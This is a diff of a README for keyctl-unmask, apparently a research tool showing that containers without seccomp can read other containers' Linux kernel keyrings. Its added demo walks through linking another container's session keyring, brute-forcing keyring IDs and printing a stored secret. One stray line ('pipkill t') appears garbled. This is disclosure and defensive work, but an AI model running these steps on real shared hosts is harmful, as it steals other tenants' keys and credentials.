@@ -5,6 +5,10 @@ within a container.
 
 ## Background 
 
+Container security folks have known that keyctl usage within containers 
+is a risky operation because there is no inherent way to isolate the Linux Kernel's
+keyrings and keys that often store sensitive content. 
+
 the `keyctl()` syscall allows a user to interact with Linux kernel keyrings
 which store sensitive information per user, session, threat, or process (among
 others). These keyrings are used by different applications and are usually in
@@ -13,6 +17,7 @@ others). These keyrings are used by different applications and are usually in
 For containers, this was deemed a security risk ( and you might agree ) because you
 don't want your containers to be able to see your hosts' keys/keyrings or other
 containers' keyrings.  
+pipkill t
 
 On part of the original fix for this was to simply "mask" `/proc/keys` so that `cat
 /proc/keys` would return no results. 
@@ -122,45 +127,117 @@ Here are some other projects that seem to be using keyctl syscalls (but don't ha
 * cifs-utils
 * [Google fscryptctl](https://github.com/google/fscryptctl/blob/142326810eb19d6794793db6d24d0775a15aa8e5/fscryptctl.c#L100)
 
-
-<!-- TODO uhhh hol up
-
-```seccomp git:(master) ✗ docker run -it -v $(pwd)/output.test:/output.test --security-opt seccomp=$(pwd)/cyberark.seccomp keyctlunmask /bin/bash
-> keyctl get_persistent @s -1
-<WORKS>
-```
-^^ this means cyberark can still steal other people's kerberos shit
-and it also means that there's nothing cyberark can do to prevent someone from yanking th ekeys!                                              
-
-
-* What's the meaning of this shit? https://github.com/moby/qemu/pull/7/commits/e2e55ccdab5eee09d3be37a6bd05bff78bc77381
-
-    > # /snap/docker/VERSION/bin/docker-runc
-      #   "do not inherit the parent's session keyring"
-      #   "make session keyring searcheable"
-      # runC uses this to ensure the container doesn't have access to the host
-      # keyring
-      keyctl
-   vas ist das? https://github.com/snapcore/snapd/blob/263fe79965e1d438a257c038e710bf444eefcb4f/interfaces/builtin/docker_support.go -->
-  
-
 ## Demo Docker
 
-In one container, create a new key:
+In one container, create a new key representing a secret stored by a container:
 
-~~~
-docker run -it --security-opt seccomp=unconfined keyctl /bin/bash \
+~~~shell
+docker run --name secret-server -it --security-opt seccomp=unconfined antitree/keyctl-unmask /bin/bash \
 > keyctl add user antitrees_secret thetruthisiliketrees @s
 123456789
+> keyctl show
+Session Keyring
+ 899321446 --alswrv      0     0  keyring: _ses.95f119ce25274b852fc62369089dcb4fbe15678e62eecfdc685d292e6a01f852
+ 911117332 --alswrv      0     0   \_ user: antitrees_secret
 ~~~
 
-Run a container (with seccomp disabled like Kubernetes) and guess they keys:
+If we were cheating, we could see that we have a session keyring ID of 899321446
+and a user key ID of 911117332. The secret is in the key but we can't access the
+key without linking the session. 
 
+Start a separate container and attach a shell so we can test some things
+
+~~~shell
+docker run -it --name keyctl-attacker --security-opt seccomp=unconfined antitree/keyctl-unmask /bin/bash
 ~~~
-docker run -it --security-opt seccomp=unconfined keyctl /bin/bash \
-> keyctl_hunter -key 123456790
-> cat keyctl_ids.txt
+
+To begin, lets prove that Docker is masking the `/proc/keys` path:
+
+~~~shell
+root@keyctl-attacker:/# cat /proc/keys
+root@keyctl-attacker:/# 
 ~~~
+
+Nothing. Because it's masked by an overmount. 
+
+The `keyctl` tool is designed to let us interact with keyrings and keys in Linux, this demonstrates the problem:
+
+
+Show me the current user's session:
+
+~~~shell
+root@keyctl-attacker:/# keyctl show
+Session Keyring
+ 966368664 --alswrv      0     0  keyring: _ses.94e0b6836d5f343f2a288731c26c96e4656591fbec68c556b5dab32390a04024
+~~~
+
+To demonstrate the problem, I'm going to show you what happens even if you know the key ID of the secret:
+
+~~~shell
+root@94e0b6836d5f:/# keyctl print 123456789
+keyctl_read_alloc: Permission denied
+~~~
+
+But why? I thought we said we're root and everything isn't isolated. The problem
+here is that we don't "Possess" the key which means the key/keyring isn't in one
+of the keyrings our account uses (@s, @us, @u, @p, @t,...).  In order to Possess
+the key, we have to Link the key's parent Keyring to a Keyring that we own. 
+
+Again, if you know the key ID's here how you could link the parent keyring to
+your session keyring, show the keys, and then print the key we really wanted
+access to . 
+
+~~~shell
+root@94e0b6836d5f:/# keyctl link 899321446 @s
+root@94e0b6836d5f:/# keyctl show
+Session Keyring
+ 966368664 --alswrv      0     0  keyring: _ses.94e0b6836d5f343f2a288731c26c96e4656591fbec68c556b5dab32390a04024
+ 899321446 --alswrv      0     0   \_ keyring: _ses.95f119ce25274b852fc62369089dcb4fbe15678e62eecfdc685d292e6a01f852
+ 911117332 --alswrv      0     0       \_ user: antitrees_secret
+root@94e0b6836d5f:/# keyctl print 911117332
+thetruthisiliketrees
+~~~
+
+...But you don't know the user key ID or, more importantly the keyring ID. This
+is a problem that `keyctl-unmask` fixes. We don't know the parent keyring ID...
+so lets guess it!
+
+~~~shell
+root@94e0b6836d5f:/# keyctl-unmask -min 0 -max 999999999
+10 / 10 [----------------------------------------------------------------------------] 100.00% ? p/s 0s
+Output saved to:  ./keyctl_ids
+root@94e0b6836d5f:/# cat keyctl_ids 
+~~~
+
+~~~json
+{
+ "KeyId": 899321446,
+ "Valid": true,
+ "Name": "_ses.95f119ce25274b852fc62369089dcb4fbe15678e62eecfdc685d292e6a01f852",
+ "Type": "keyring",
+ "Uid": "0",
+ "Gid": "0",
+ "Perms": "3f1b0000",
+ "String_Content": "\u0014\ufffdN6",
+ "Byte_Content": "FIxONg==",
+ "Comments": null,
+ "Subkeys": [
+  {
+   "KeyId": 911117332,
+   "Valid": true,
+   "Name": "antitrees_secret",
+   "Type": "user",
+   "Uid": "0",
+   "Gid": "0",
+   "Perms": "3f010000",
+   "String_Content": "thetruthisiliketrees",
+   "Byte_Content": "dGhldHJ1dGhpc2lsaWtldHJlZXM=",
+   "Comments": null,
+   "Subkeys": null
+  }
+ ]
+~~~
+
 
 ## Demo Kubernetes
 
@@ -188,6 +265,7 @@ So we're back at where we were in 2016, containers using the keyring have a shar
 ## Further Reading
 
 * [Blog About this Issue in 2014](https://www.projectatomic.io/blog/2014/09/yet-another-reason-containers-don-t-contain-kernel-keyrings/)
+* [Overview and Recent Developers of Keyrings Subsystem](https://www.youtube.com/watch?v=KUCwiQZuasA)
 * [Indepth discussion on keys and how Posession works and is important](https://mjg59.dreamwidth.org/37333.html)
 * [keyctl(2) Syscall Man Page](https://man7.org/linux/man-pages/man2/keyctl.2.html)
 * [keyctl from keyutils usage page](https://manpages.debian.org/stretch/keyutils/keyctl.1.en.html)
